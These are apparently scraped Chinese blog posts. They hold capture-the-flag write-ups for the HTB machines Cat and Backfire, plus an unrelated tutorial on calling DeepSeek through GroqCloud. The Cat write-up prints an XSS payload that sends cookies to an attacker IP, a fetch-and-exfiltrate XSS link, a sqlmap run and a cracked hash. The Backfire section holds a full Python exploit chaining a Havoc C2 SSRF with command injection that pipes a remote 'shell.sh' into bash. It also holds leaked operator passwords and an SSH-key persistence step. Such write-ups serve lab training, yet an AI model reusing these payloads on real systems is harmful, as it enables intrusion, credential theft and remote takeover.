?\u0026gt;\u0026lt;br\u0026gt;\r\u0026lt;strong\u0026gt;Age:\u0026lt;/strong\u0026gt; \u0026lt;?php echo $cat[\u0026#39;age\u0026#39;]; ?\u0026gt;\u0026lt;br\u0026gt;\r\u0026lt;strong\u0026gt;Birthdate:\u0026lt;/strong\u0026gt; \u0026lt;?php echo $cat[\u0026#39;birthdate\u0026#39;]; ?\u0026gt;\u0026lt;br\u0026gt;\r\u0026lt;strong\u0026gt;Weight:\u0026lt;/strong\u0026gt; \u0026lt;?php echo $cat[\u0026#39;weight\u0026#39;]; ?\u0026gt; kg\u0026lt;br\u0026gt;\r\u0026lt;strong\u0026gt;Owner:\u0026lt;/strong\u0026gt; \u0026lt;?php echo $cat[\u0026#39;username\u0026#39;]; ?\u0026gt;\u0026lt;br\u0026gt;\r\u0026lt;strong\u0026gt;Created At:\u0026lt;/strong\u0026gt; \u0026lt;?php echo $cat[\u0026#39;created_at\u0026#39;]; ?\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt; 可以看到这里是直接将用户名输出到页面\n在contest.php中随意上传一个图片,然后等待管理员来查看获取到cookie\n因此注入点就是注册时候的用户名\n\u0026lt;img src=1 onerror=this.src=\u0026#34;http://10.10.xx.xx/?ccc=\u0026#34;+encodeURIComponent(document.cookie)\u0026gt; 监听得到cookie\n替换后可以进入admin的管理面板\nSQL Injection #\r在accept_cat.php中发现了直接拼接的sql语句,cat_name没有经过过滤\n\u0026lt;?php\rinclude \u0026#39;config.php\u0026#39;;\rsession_start();\rif (isset($_SESSION[\u0026#39;username\u0026#39;]) \u0026amp;\u0026amp; $_SESSION[\u0026#39;username\u0026#39;] === \u0026#39;axel\u0026#39;) {\rif ($_SERVER[\u0026#34;REQUEST_METHOD\u0026#34;] == \u0026#34;POST\u0026#34;) {\rif (isset($_POST[\u0026#39;catId\u0026#39;]) \u0026amp;\u0026amp; isset($_POST[\u0026#39;catName\u0026#39;])) {\r$cat_name = $_POST[\u0026#39;catName\u0026#39;];\r$catId = $_POST[\u0026#39;catId\u0026#39;];\r$sql_insert = \u0026#34;INSERT INTO accepted_cats (name) VALUES (\u0026#39;$cat_name\u0026#39;)\u0026#34;;\r$pdo-\u0026gt;exec($sql_insert);\r$stmt_delete = $pdo-\u0026gt;prepare(\u0026#34;DELETE FROM cats WHERE cat_id = :cat_id\u0026#34;);\r$stmt_delete-\u0026gt;bindParam(\u0026#39;:cat_id\u0026#39;, $catId, PDO::PARAM_INT);\r$stmt_delete-\u0026gt;execute();\recho \u0026#34;The cat has been accepted and added successfully.\u0026#34;;\r} else {\recho \u0026#34;Error: Cat ID or Cat Name not provided.\u0026#34;;\r}\r} else {\rheader(\u0026#34;Location: /\u0026#34;);\rexit();\r}\r} else {\recho \u0026#34;Access denied.\u0026#34;;\r}\r?\u0026gt; 在config.php中发现了数据库是SQLlite\n\u0026lt;?php\r// Database configuration\r$db_file = \u0026#39;/databases/cat.db\u0026#39;;\r// Connect to the database\rtry {\r$pdo = new PDO(\u0026#34;sqlite:$db_file\u0026#34;);\r$pdo-\u0026gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);\r} catch (PDOException $e) {\rdie(\u0026#34;Error: \u0026#34; . $e-\u0026gt;getMessage());\r}\r?\u0026gt; 因此多半是SQL盲注的类型\n[root@kali] /home/kali/Cat/catgit (master) ❯ sqlmap -u \u0026#34;http://cat.htb/accept_cat.php\u0026#34; --cookie=\u0026#34;PHPSESSID=918f1nvps72fc7rvk5umu13jch\u0026#34; --data=\u0026#34;catId=1\u0026amp;catName=123\u0026#34; -p catName --dbms=SQLite --level=5 得到四个表\n在users表中拿到了\nrosamendoza485@gmail.com ac369922d560f17d6eeb8b2c7dec498c (如果爆不出来,可能需要重启靶机)\n到这个网站去解密,我用rockyou.txt好像爆不出来\nCrackStation - Online Password Hash Cracking - MD5, SHA1, Linux, Rainbow Tables, etc. 用这个密码登录rosa的账号,发现还有其他的几个用户\n查看apache的日志,得到了axel的密码\nrosa@cat:~$ cat /var/log/apache2/access.log | grep axel 登录后拿到user.txt\nROOT #\r发现了内部开启了3000端口\n将其转发出来,发现是一个Git服务\n[root@kali] /home/kali ❯ ssh rosa@cat.htb -L 3000:127.0.0.1:3000 其版本号是1.22.0,我查询到了一个可能的XSS漏洞\nCVE-2024-6886 #\rGitea 1.22.0 - Stored XSS - Multiple webapps Exploit 在**/var/mail/axel**中得到一段留言\n需要给jobert发邮件,然后他会检查仓库,造成XSS漏洞\njobert应该是有访问employee-management这个仓库的权限的\n\u0026lt;a href=\u0026#34;javascript:fetch(\u0026#39;http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php\u0026#39;).then(response =\u0026gt; response.text()).then(data =\u0026gt; fetch(\u0026#39;http://10.10.xx.xx/?content=\u0026#39;+encodeURIComponent(data)))\u0026#34;\u0026gt;XSS test\u0026lt;/a\u0026gt; 由于25端口是开在127.0.0.1上的,因此也需要将其转发出来\n使用以下命令给jobert发邮件\n[root@kali] /home/kali ❯swaks --to \u0026#34;jobert@localhost\u0026#34; --from \u0026#34;axel@localhost\u0026#34; --header \u0026#34;Click\u0026#34; --body \u0026#34;http://localhost:3000/axel/xss\u0026#34; --server localhost 进行url解码拿到密码\n拿到root.txt\nSummary #\rUser: 通过Git泄露拿到源码, 存在SQL注入漏洞拿到rosa的密码,由于网页的登录表单是通过GET明文传输的,因此在apache的日志中拿到axel的密码,从而拿到user.txt\nRoot: 将内网3000端口转发出来查找到CVE漏洞,在邮件中得到线索进一步确认是XSS漏洞,employee-management这个仓库自己无法访问只能通过XSS外带,最后在其index.php中拿到了密码\n","date":"2025-02-13","externalUrl":null,"permalink":"/posts/2025/02/htb-cat/","section":"Posts","summary":"","title":"HTB-Cat","type":"posts"},{"content":"","date":"2025-01-31","externalUrl":null,"permalink":"/tags/deepseek/","section":"Tags","summary":"","title":"Deepseek","type":"tags"},{"content":"\r前言 #\r最近出来了一个新的国产AI模型DeepSeek，并且具有深度思考的功能。\n我体验过后感觉比ChatGPT要好很多，体现在DeepSeek能更好的理解用户的问题。\n不过官网上的对话，总是要思考一会，从几秒到几十秒不等，问题越复杂考虑的就越久（当然这是好事，对问题分析的越清晰，回答的准确率就越高。也有可能是服务器被攻击了）。\n因此这篇文章是关于如何通过API来使用DeepSeek\nGroqCloud #\r到下面这个官网中进入Dev Console，需要使用谷歌或者Github账号\nGroqCloud - Groq is Fast AI Inference 切换模型为deepseek-r1-distill-llama-70b\n与官网上的模型不同的是，DeepSeek-R1-Distill-LLAMA-70B 是 DeepSeek 公司基于 Meta 的 LLAMA 模型，通过知识蒸馏技术开发的一款高效大语言模型。它结合了大规模模型的强大能力和知识蒸馏带来的高效性，广泛应用于自然语言理解和生成任务。随着技术的不断发展，这类模型将在各个领域发挥越来越重要的作用。\n点击左侧API Keys里的Create API Key\nCherry Studio #\r到官网下载一个对话软件\n填入API密钥后，底部添加一个模型，名称一致即可\n对比测试 #\r可以看到使用API调用的深度思考时间极短，只有0.3秒\n当然，GroqCloud上面还有其他的模型，如果不喜欢DeepSeek也可以尝试其他的\n通过API调用能够节省很多时间，尽管模型在参数上有一点区别，但是也够用了\nPS：使用过程需要开启梯子\n","date":"2025-01-31","externalUrl":null,"permalink":"/posts/2025/01/deepseek-api-usage-tutorial/","section":"Posts","summary":"","title":"DeepSeekAPI调用教程","type":"posts"},{"content":"","date":"2025-01-31","externalUrl":null,"permalink":"/tags/tutorial/","section":"Tags","summary":"","title":"Tutorial","type":"tags"},{"content":"","date":"2025-01-31","externalUrl":null,"permalink":"/categories/tutorial/","section":"Categories","summary":"","title":"Tutorial","type":"categories"},{"content":"\rBox Info #\rOS Linux Difficulty Medium Nmap #\r[root@kali] /home/kali/Backfire ❯ nmap backfire.htb -sV -Pn -T4 PORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)\r443/tcp open ssl/http nginx 1.22.1\r5000/tcp filtered upnp\r8000/tcp open http nginx 1.22.1\rService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 访问backfire.htb:8000可以得到两个文件\nhavoc.yaotl\nTeamserver {\rHost = \u0026#34;127.0.0.1\u0026#34;\rPort = 40056\rBuild {\rCompiler64 = \u0026#34;data/x86_64-w64-mingw32-cross/bin/x86_64-w64-mingw32-gcc\u0026#34;\rCompiler86 = \u0026#34;data/i686-w64-mingw32-cross/bin/i686-w64-mingw32-gcc\u0026#34;\rNasm = \u0026#34;/usr/bin/nasm\u0026#34;\r}\r}\rOperators {\ruser \u0026#34;ilya\u0026#34; {\rPassword = \u0026#34;CobaltStr1keSuckz!\u0026#34;\r}\ruser \u0026#34;sergej\u0026#34; {\rPassword = \u0026#34;1w4nt2sw1tch2h4rdh4tc2\u0026#34;\r}\r}\rDemon {\rSleep = 2\rJitter = 15\rTrustXForwardedFor = false\rInjection {\rSpawn64 = \u0026#34;C:\\\\Windows\\\\System32\\\\notepad.exe\u0026#34;\rSpawn32 = \u0026#34;C:\\\\Windows\\\\SysWOW64\\\\notepad.exe\u0026#34;\r}\r}\rListeners {\rHttp {\rName = \u0026#34;Demon Listener\u0026#34;\rHosts = [\r\u0026#34;backfire.htb\u0026#34;\r]\rHostBind = \u0026#34;127.0.0.1\u0026#34; PortBind = 8443\rPortConn = 8443\rHostRotation = \u0026#34;round-robin\u0026#34;\rSecure = true\r}\r} disable_tls.patch\nDisable TLS for Websocket management port 40056, so I can prove that\rsergej is not doing any work\rManagement port only allows local connections (we use ssh forwarding) so this will not compromize our teamserver\rdiff --git a/client/src/Havoc/Connector.cc b/client/src/Havoc/Connector.cc\rindex abdf1b5..6be76fb 100644\r--- a/client/src/Havoc/Connector.cc\r+++ b/client/src/Havoc/Connector.cc\r@@ -8,12 +8,11 @@ Connector::Connector( Util::ConnectionInfo* ConnectionInfo )\r{\rTeamserver = ConnectionInfo;\rSocket = new QWebSocket();\r- auto Server = \u0026#34;wss://\u0026#34; + Teamserver-\u0026gt;Host + \u0026#34;:\u0026#34; + this-\u0026gt;Teamserver-\u0026gt;Port + \u0026#34;/havoc/\u0026#34;;\r+ auto Server = \u0026#34;ws://\u0026#34; + Teamserver-\u0026gt;Host + \u0026#34;:\u0026#34; + this-\u0026gt;Teamserver-\u0026gt;Port + \u0026#34;/havoc/\u0026#34;;\rauto SslConf = Socket-\u0026gt;sslConfiguration();\r/* ignore annoying SSL errors */\rSslConf.setPeerVerifyMode( QSslSocket::VerifyNone );\r- Socket-\u0026gt;setSslConfiguration( SslConf );\rSocket-\u0026gt;ignoreSslErrors();\rQObject::connect( Socket, \u0026amp;QWebSocket::binaryMessageReceived, this, [\u0026amp;]( const QByteArray\u0026amp; Message )\rdiff --git a/teamserver/cmd/server/teamserver.go b/teamserver/cmd/server/teamserver.go\rindex 9d1c21f..59d350d 100644\r--- a/teamserver/cmd/server/teamserver.go\r+++ b/teamserver/cmd/server/teamserver.go\r@@ -151,7 +151,7 @@ func (t *Teamserver) Start() {\r}\r// start the teamserver\r-\tif err = t.Server.Engine.RunTLS(Host+\u0026#34;:\u0026#34;+Port, certPath, keyPath); err != nil {\r+\tif err = t.Server.Engine.Run(Host+\u0026#34;:\u0026#34;+Port); err != nil {\rlogger.Error(\u0026#34;Failed to start websocket: \u0026#34; + err.Error())\r}\r看起来是开了一个Havoc服务端：HavocFramework/Havoc: The Havoc Framework\n并且暴露出了连接的用户名和密码，不过我安装好Havoc后并不能连接成功\nHavoc RCE #\r经过搜索我发现了一个可能存在的CVE漏洞\n[github author=\u0026ldquo;chebuya\u0026rdquo; project=\u0026ldquo;Havoc-C2-SSRF-poc\u0026rdquo;][/github]\n以及这个\n[github author=\u0026ldquo;IncludeSecurity\u0026rdquo; project=\u0026ldquo;c2-vulnerabilities\u0026rdquo;][/github]\n第一个脚本的主要功能\n伪造 agent 注册：通过发送伪造的 agent 注册请求，触发目标服务器执行一些操作（如打开套接字）。\n打开套接字：通过特定的命令控制目标服务器打开套接字，允许远程连接。\n写数据到套接字：向服务器开放的套接字写入数据，可以用于进一步的请求。\n读取套接字数据：读取目标服务器响应的数据，获取敏感信息（例如 IP 地址）。\n第二个脚本的主要功能\nWebSocket 连接：通过 WebSocket（加密的 wss://）与远程团队服务器建立连接。\n身份验证：使用用户名和 SHA3-256 加密的密码进行身份验证。\n监听器创建：向服务器发送请求创建一个监听器，用于构建 \u0026ldquo;demon agent\u0026rdquo;。\n远程命令执行：通过命令注入漏洞，向服务器发送恶意载荷来执行本地命令（RCE）。\n因此可以考虑的是，将两个脚本结合起来，在注册完register后使用websocket命令注入，由于两个脚本的通信协议是不同的，因此需要将HTTP协议注册后升级为Websocket协议\n升级协议的报头类似于这样\nGET /chat HTTP/1.1\rHost: server.example.com\rUpgrade: websocket\rConnection: Upgrade\rSec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==\rSec-WebSocket-Protocol: chat, superchat\rSec-WebSocket-Version: 13 将升级协议的数据通过套接字发送到服务器\n由于使用的是Websocket通信，那么对应的数据也要转换为Websocket的格式，这在python自带的库中是封装好的，但是这里是从HTTP转换的，因此需要手动转换数据为Websocket数据帧\n最终的代码如下\nimport binascii\rimport json\rimport random\rimport requests\rimport argparse\rimport urllib3\rimport os\rimport hashlib\rurllib3.disable_warnings()\rfrom Crypto.Cipher import AES\rfrom Crypto.Util import Counter\rkey_bytes = 32\rdef decrypt(key, iv, ciphertext):\rif len(key) \u0026lt;= key_bytes:\rfor _ in range(len(key), key_bytes):\rkey += b\u0026#34;0\u0026#34;\rassert len(key) == key_bytes\riv_int = int(binascii.hexlify(iv), 16)\rctr = Counter.new(AES.block_size * 8, initial_value=iv_int)\raes = AES.new(key, AES.MODE_CTR, counter=ctr)\rplaintext = aes.decrypt(ciphertext)\rreturn plaintext\rdef int_to_bytes(value, length=4, byteorder=\u0026#34;big\u0026#34;):\rreturn value.to_bytes(length, byteorder)\rdef encrypt(key, iv, plaintext):\rif len(key) \u0026lt;= key_bytes:\rfor x in range(len(key),key_bytes):\rkey = key + b\u0026#34;0\u0026#34;\rassert len(key) == key_bytes\riv_int = int(binascii.hexlify(iv), 16)\rctr = Counter.new(AES.block_size * 8, initial_value=iv_int)\raes = AES.new(key, AES.MODE_CTR, counter=ctr)\rciphertext = aes.encrypt(plaintext)\rreturn ciphertext\rdef register_agent(hostname, username, domain_name, internal_ip, process_name, process_id):\r# DEMON_INITIALIZE / 99\rcommand = b\u0026#34;\\x00\\x00\\x00\\x63\u0026#34;\rrequest_id = b\u0026#34;\\x00\\x00\\x00\\x01\u0026#34;\rdemon_id = agent_id\rhostname_length = int_to_bytes(len(hostname))\rusername_length = int_to_bytes(len(username))\rdomain_name_length = int_to_bytes(len(domain_name))\rinternal_ip_length = int_to_bytes(len(internal_ip))\rprocess_name_length = int_to_bytes(len(process_name) - 6)\rdata = b\u0026#34;\\xab\u0026#34; * 100\rheader_data = command + request_id + AES_Key + AES_IV + demon_id + hostname_length + hostname + username_length + username + domain_name_length + domain_name + internal_ip_length + internal_ip + process_name_length + process_name + process_id + data\rsize = 12 + len(header_data)\rsize_bytes = size.to_bytes(4, \u0026#39;big\u0026#39;)\ragent_header = size_bytes + magic + agent_id\rprint(\u0026#34;[***] Trying to register agent...\u0026#34;)\rr = requests.post(teamserver_listener_url, data=agent_header + header_data, headers=headers, verify=False)\rif r.status_code == 200:\rprint(\u0026#34;[***] Success!\u0026#34;)\relse:\rprint(f\u0026#34;[!!!] Failed to register agent - {r.status_code} {r.text}\u0026#34;)\rdef open_socket(socket_id, target_address, target_port):\r# COMMAND_SOCKET / 2540\rcommand = b\u0026#34;\\x00\\x00\\x09\\xec\u0026#34;\rrequest_id = b\u0026#34;\\x00\\x00\\x00\\x02\u0026#34;\r# SOCKET_COMMAND_OPEN / 16\rsubcommand = b\u0026#34;\\x00\\x00\\x00\\x10\u0026#34;\rsub_request_id = b\u0026#34;\\x00\\x00\\x00\\x03\u0026#34;\rlocal_addr = b\u0026#34;\\x22\\x22\\x22\\x22\u0026#34;\rlocal_port = b\u0026#34;\\x33\\x33\\x33\\x33\u0026#34;\rforward_addr = b\u0026#34;\u0026#34;\rfor octet in target_address.split(\u0026#34;.\u0026#34;)[::-1]:\rforward_addr += int_to_bytes(int(octet), length=1)\rforward_port = int_to_bytes(target_port)\rpackage = subcommand+socket_id+local_addr+local_port+forward_addr+forward_port\rpackage_size = int_to_bytes(len(package) + 4)\rheader_data = command + request_id + encrypt(AES_Key, AES_IV, package_size + package)\rsize = 12 + len(header_data)\rsize_bytes = size.to_bytes(4, \u0026#39;big\u0026#39;)\ragent_header = size_bytes + magic + agent_id\rdata = agent_header + header_data\rprint(\u0026#34;[***] Trying to open socket on the teamserver...\u0026#34;)\rr = requests.post(teamserver_listener_url, data=data, headers=headers, verify=False)\rif r.status_code == 200:\rprint(\u0026#34;[***] Success!\u0026#34;)\relse:\rprint(f\u0026#34;[!!!] Failed to open socket on teamserver - {r.status_code} {r.text}\u0026#34;)\rdef write_socket(socket_id, data):\r# COMMAND_SOCKET / 2540\rcommand = b\u0026#34;\\x00\\x00\\x09\\xec\u0026#34;\rrequest_id = b\u0026#34;\\x00\\x00\\x00\\x08\u0026#34;\r# SOCKET_COMMAND_READ / 11\rsubcommand = b\u0026#34;\\x00\\x00\\x00\\x11\u0026#34;\rsub_request_id = b\u0026#34;\\x00\\x00\\x00\\xa1\u0026#34;\r# SOCKET_TYPE_CLIENT / 3\rsocket_type = b\u0026#34;\\x00\\x00\\x00\\x03\u0026#34;\rsuccess = b\u0026#34;\\x00\\x00\\x00\\x01\u0026#34;\rdata_length = int_to_bytes(len(data))\rpackage = subcommand+socket_id+socket_type+success+data_length+data\rpackage_size = int_to_bytes(len(package) + 4)\rheader_data = command + request_id + encrypt(AES_Key, AES_IV, package_size + package)\rsize = 12 + len(header_data)\rsize_bytes = size.to_bytes(4, \u0026#39;big\u0026#39;)\ragent_header = size_bytes + magic + agent_id\rpost_data = agent_header + header_data\rprint(\u0026#34;[***] Trying to write to the socket\u0026#34;)\rr = requests.post(teamserver_listener_url, data=post_data, headers=headers, verify=False)\rif r.status_code == 200:\rprint(\u0026#34;[***] Success!\u0026#34;)\relse:\rprint(f\u0026#34;[!!!] Failed to write data to the socket - {r.status_code} {r.text}\u0026#34;)\rdef read_socket(socket_id):\r# COMMAND_GET_JOB / 1\rcommand = b\u0026#34;\\x00\\x00\\x00\\x01\u0026#34;\rrequest_id = b\u0026#34;\\x00\\x00\\x00\\x09\u0026#34;\rheader_data = command + request_id\rsize = 12 + len(header_data)\rsize_bytes = size.to_bytes(4, \u0026#39;big\u0026#39;)\ragent_header = size_bytes + magic + agent_id\rdata = agent_header + header_data\rprint(\u0026#34;[***] Trying to poll teamserver for socket output...\u0026#34;)\rr = requests.post(teamserver_listener_url, data=data, headers=headers, verify=False)\rif r.status_code == 200:\rprint(\u0026#34;[***] Read socket output successfully!\u0026#34;)\relse:\rprint(f\u0026#34;[!!!] Failed to read socket output - {r.status_code} {r.text}\u0026#34;)\rreturn \u0026#34;\u0026#34;\rcommand_id = int.from_bytes(r.content[0:4], \u0026#34;little\u0026#34;)\rrequest_id = int.from_bytes(r.content[4:8], \u0026#34;little\u0026#34;)\rpackage_size = int.from_bytes(r.content[8:12], \u0026#34;little\u0026#34;)\renc_package = r.content[12:]\rreturn decrypt(AES_Key, AES_IV, enc_package)[12:]\rdef create_websocket_request(host, port):\rrequest = (\rf\u0026#34;GET /havoc/ HTTP/1.1\\r\\n\u0026#34;\rf\u0026#34;Host: {host}:{port}\\r\\n\u0026#34;\rf\u0026#34;Upgrade: websocket\\r\\n\u0026#34;\rf\u0026#34;Connection: Upgrade\\r\\n\u0026#34;\rf\u0026#34;Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==\\r\\n\u0026#34;\rf\u0026#34;Sec-WebSocket-Version: 13\\r\\n\u0026#34;\rf\u0026#34;\\r\\n\u0026#34;\r).encode()\rreturn request\rdef build_websocket_frame(payload):\rpayload_bytes = payload.encode(\u0026#34;utf-8\u0026#34;)\rframe = bytearray()\rframe.append(0x81)\rpayload_length = len(payload_bytes)\rif payload_length \u0026lt;= 125:\rframe.append(0x80 | payload_length)\relif payload_length \u0026lt;= 65535:\rframe.append(0x80 | 126)\rframe.extend(payload_length.to_bytes(2, byteorder=\u0026#34;big\u0026#34;))\relse:\rframe.append(0x80 | 127)\rframe.extend(payload_length.to_bytes(8, byteorder=\u0026#34;big\u0026#34;))\rmasking_key = os.urandom(4)\rframe.extend(masking_key)\rmasked_payload = bytearray(byte ^ masking_key[i % 4] for i, byte in enumerate(payload_bytes))\rframe.extend(masked_payload)\rreturn frame\rparser = argparse.ArgumentParser()\rparser.add_argument(\u0026#34;-t\u0026#34;, \u0026#34;--target\u0026#34;, help=\u0026#34;The listener target in URL format\u0026#34;, required=True)\rparser.add_argument(\u0026#34;-i\u0026#34;, \u0026#34;--ip\u0026#34;, help=\u0026#34;The IP to open the socket with\u0026#34;, required=True)\rparser.add_argument(\u0026#34;-p\u0026#34;, \u0026#34;--port\u0026#34;, help=\u0026#34;The port to open the socket with\u0026#34;, required=True)\rparser.add_argument(\u0026#34;-A\u0026#34;, \u0026#34;--user-agent\u0026#34;, help=\u0026#34;The User-Agent for the spoofed agent\u0026#34;, default=\u0026#34;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36\u0026#34;)\rparser.add_argument(\u0026#34;-H\u0026#34;, \u0026#34;--hostname\u0026#34;, help=\u0026#34;The hostname for the spoofed agent\u0026#34;, default=\u0026#34;DESKTOP-7F61JT1\u0026#34;)\rparser.add_argument(\u0026#34;-u\u0026#34;, \u0026#34;--username\u0026#34;, help=\u0026#34;The username for the spoofed agent\u0026#34;, default=\u0026#34;Administrator\u0026#34;)\rparser.add_argument(\u0026#34;-d\u0026#34;, \u0026#34;--domain-name\u0026#34;, help=\u0026#34;The domain name for the spoofed agent\u0026#34;, default=\u0026#34;ECORP\u0026#34;)\rparser.add_argument(\u0026#34;-n\u0026#34;, \u0026#34;--process-name\u0026#34;, help=\u0026#34;The process name for the spoofed agent\u0026#34;, default=\u0026#34;msedge.exe\u0026#34;)\rparser.add_argument(\u0026#34;-ip\u0026#34;, \u0026#34;--internal-ip\u0026#34;, help=\u0026#34;The internal ip for the spoofed agent\u0026#34;, default=\u0026#34;10.1.33.7\u0026#34;)\rargs = parser.parse_args()\r# 0xDEADBEEF\rmagic = b\u0026#34;\\xde\\xad\\xbe\\xef\u0026#34;\rteamserver_listener_url = args.target\rheaders = {\r\u0026#34;User-Agent\u0026#34;: args.user_agent\r}\ragent_id = int_to_bytes(random.randint(100000, 1000000))\rAES_Key = b\u0026#34;\\x00\u0026#34; * 32\rAES_IV = b\u0026#34;\\x00\u0026#34; * 16\rhostname = bytes(args.hostname, encoding=\u0026#34;utf-8\u0026#34;)\rusername = bytes(args.username, encoding=\u0026#34;utf-8\u0026#34;)\rdomain_name = bytes(args.domain_name, encoding=\u0026#34;utf-8\u0026#34;)\rinternal_ip = bytes(args.internal_ip, encoding=\u0026#34;utf-8\u0026#34;)\rprocess_name = args.process_name.encode(\u0026#34;utf-16le\u0026#34;)\rprocess_id = int_to_bytes(random.randint(1000, 5000))\rregister_agent(hostname, username, domain_name, internal_ip, process_name, process_id)\rsocket_id = b\u0026#34;\\x11\\x11\\x11\\x11\u0026#34;\ropen_socket(socket_id, args.ip, int(args.port))\rHOSTNAME = \u0026#34;127.0.0.1\u0026#34;\rPORT = 40056\rUSER = \u0026#34;ilya\u0026#34;\rPASSWORD = \u0026#34;CobaltStr1keSuckz!\u0026#34;\r#upgrade http to websocet so that we can use the second script\rwrite_socket(socket_id,create_websocket_request(host=HOSTNAME, port=PORT))\r# Authenticate to teamserver\rpayload = {\u0026#34;Body\u0026#34;: {\u0026#34;Info\u0026#34;: {\u0026#34;Password\u0026#34;: hashlib.sha3_256(PASSWORD.encode()).hexdigest(), \u0026#34;User\u0026#34;: USER}, \u0026#34;SubEvent\u0026#34;: 3}, \u0026#34;Head\u0026#34;: {\u0026#34;Event\u0026#34;: 1, \u0026#34;OneTime\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;Time\u0026#34;: \u0026#34;18:40:17\u0026#34;, \u0026#34;User\u0026#34;: USER}}\rpayload_json=json.dumps(payload)\rwrite_socket(socket_id, build_websocket_frame(payload_json))\r# Create a listener to build demon agent for\rpayload = {\u0026#34;Body\u0026#34;:{\u0026#34;Info\u0026#34;:{\u0026#34;Headers\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;HostBind\u0026#34;:\u0026#34;0.0.0.0\u0026#34;,\u0026#34;HostHeader\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;HostRotation\u0026#34;:\u0026#34;round-robin\u0026#34;,\u0026#34;Hosts\u0026#34;:\u0026#34;0.0.0.0\u0026#34;,\u0026#34;Name\u0026#34;:\u0026#34;abc\u0026#34;,\u0026#34;PortBind\u0026#34;:\u0026#34;443\u0026#34;,\u0026#34;PortConn\u0026#34;:\u0026#34;443\u0026#34;,\u0026#34;Protocol\u0026#34;:\u0026#34;Https\u0026#34;,\u0026#34;Proxy Enabled\u0026#34;:\u0026#34;false\u0026#34;,\u0026#34;Secure\u0026#34;:\u0026#34;true\u0026#34;,\u0026#34;Status\u0026#34;:\u0026#34;online\u0026#34;,\u0026#34;Uris\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;UserAgent\u0026#34;:\u0026#34;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36\u0026#34;},\u0026#34;SubEvent\u0026#34;:1},\u0026#34;Head\u0026#34;:{\u0026#34;Event\u0026#34;:2,\u0026#34;OneTime\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;Time\u0026#34;:\u0026#34;08:39:18\u0026#34;,\u0026#34;User\u0026#34;: USER}}\rpayload_json=json.dumps(payload)\rwrite_socket(socket_id, build_websocket_frame(payload_json))\r# Create a psuedo shell with RCE loop Change Here\rcmd = \u0026#39;curl http://10.10.xx.xx/shell.sh | bash\u0026#39;\rinjection = \u0026#34;\u0026#34;\u0026#34; \\\\\\\\\\\\\\\u0026#34; -mbla; \u0026#34;\u0026#34;\u0026#34; + cmd + \u0026#34;\u0026#34;\u0026#34; 1\u0026gt;\u0026amp;2 \u0026amp;\u0026amp; false #\u0026#34;\u0026#34;\u0026#34;\r# Command injection in demon compilation command\rpayload = {\u0026#34;Body\u0026#34;: {\u0026#34;Info\u0026#34;: {\u0026#34;AgentType\u0026#34;: \u0026#34;Demon\u0026#34;, \u0026#34;Arch\u0026#34;: \u0026#34;x64\u0026#34;, \u0026#34;Config\u0026#34;: \u0026#34;{\\n \\\u0026#34;Amsi/Etw Patch\\\u0026#34;: \\\u0026#34;None\\\u0026#34;,\\n \\\u0026#34;Indirect Syscall\\\u0026#34;: false,\\n \\\u0026#34;Injection\\\u0026#34;: {\\n \\\u0026#34;Alloc\\\u0026#34;: \\\u0026#34;Native/Syscall\\\u0026#34;,\\n \\\u0026#34;Execute\\\u0026#34;: \\\u0026#34;Native/Syscall\\\u0026#34;,\\n \\\u0026#34;Spawn32\\\u0026#34;: \\\u0026#34;C:\\\\\\\\Windows\\\\\\\\SysWOW64\\\\\\\\notepad.exe\\\u0026#34;,\\n \\\u0026#34;Spawn64\\\u0026#34;: \\\u0026#34;C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\notepad.exe\\\u0026#34;\\n },\\n \\\u0026#34;Jitter\\\u0026#34;: \\\u0026#34;0\\\u0026#34;,\\n \\\u0026#34;Proxy Loading\\\u0026#34;: \\\u0026#34;None (LdrLoadDll)\\\u0026#34;,\\n \\\u0026#34;Service Name\\\u0026#34;:\\\u0026#34;\u0026#34; + injection + \u0026#34;\\\u0026#34;,\\n \\\u0026#34;Sleep\\\u0026#34;: \\\u0026#34;2\\\u0026#34;,\\n \\\u0026#34;Sleep Jmp Gadget\\\u0026#34;: \\\u0026#34;None\\\u0026#34;,\\n \\\u0026#34;Sleep Technique\\\u0026#34;: \\\u0026#34;WaitForSingleObjectEx\\\u0026#34;,\\n \\\u0026#34;Stack Duplication\\\u0026#34;: false\\n}\\n\u0026#34;, \u0026#34;Format\u0026#34;: \u0026#34;Windows Service Exe\u0026#34;, \u0026#34;Listener\u0026#34;: \u0026#34;abc\u0026#34;}, \u0026#34;SubEvent\u0026#34;: 2}, \u0026#34;Head\u0026#34;: {\r\u0026#34;Event\u0026#34;: 5, \u0026#34;OneTime\u0026#34;: \u0026#34;true\u0026#34;, \u0026#34;Time\u0026#34;: \u0026#34;18:39:04\u0026#34;, \u0026#34;User\u0026#34;: USER}}\rpayload_json=json.dumps(payload)\rwrite_socket(socket_id, build_websocket_frame(payload_json)) 然后设置监听，获取到了反弹Shell，并且拿到user.txt\nRoot #\r由于这个反弹Shell会在一段时间后断掉，因此需要找到一个方式进行持久化连接\n把本地的ssh公钥追加到ilya的密钥文件中\n#in reverse shell echo \u0026#34;your key\u0026#34; \u0026gt;\u0026gt; ~/.ssh/authorized_keys ilya@backfire:~$ cat hardhat.txt Sergej said he installed HardHatC2 for testing and not made any changes to the defaults\rI hope he prefers Havoc bcoz I don\u0026#39;t wanna learn another C2 framework, also Go \u0026gt; C# 查看内网端口情况\n搜索这个HardHatC2的相关漏洞，我找到了这个👇\nHardHatC2 0-Days (RCE \u0026amp; AuthN Bypass) | by Pichaya Morimoto | Jan, 2025 | สยามถนัดแฮก 首先需要将内网的7096端口和5000端口通过SSH代理出来\n[root@kali] /home/kali/Backfire ❯ ssh 